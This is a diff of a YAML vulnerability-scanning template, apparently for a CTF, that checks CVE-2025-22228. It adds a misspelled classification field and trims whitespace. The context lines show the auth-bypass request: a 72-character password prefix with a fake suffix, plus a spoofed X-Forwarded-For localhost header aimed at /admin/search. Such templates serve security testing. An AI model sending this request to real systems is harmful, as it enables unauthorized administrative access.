@@ -8,6 +8,8 @@ info:
     Registers a user, logs in, and attempts to access the /admin/search endpoint 
     using a truncated password (CVE-2025-22228) and X-Forwarded-For header.
   tags: ctf, spring, cve, auth-bypass
+  classfication:
+    cve-id: CVE-2025-22228
 
 variables:
   username: "{{randstr}}"
@@ -44,12 +46,12 @@ http:
         Host: {{Hostname}}
         X-Forwarded-For: 127.0.0.1
         Content-Type: application/json
-        
+
         {"apiKey": "test", "password": "{{prefix_72}}{{fake_suffix}}"}
 
     # 로그인 후 세션을 유지하기 위해 필수
     cookie-reuse: true
-    
+
     matchers-condition: and
     matchers:
       # 세 번째 요청(/admin/search)의 결과 검증
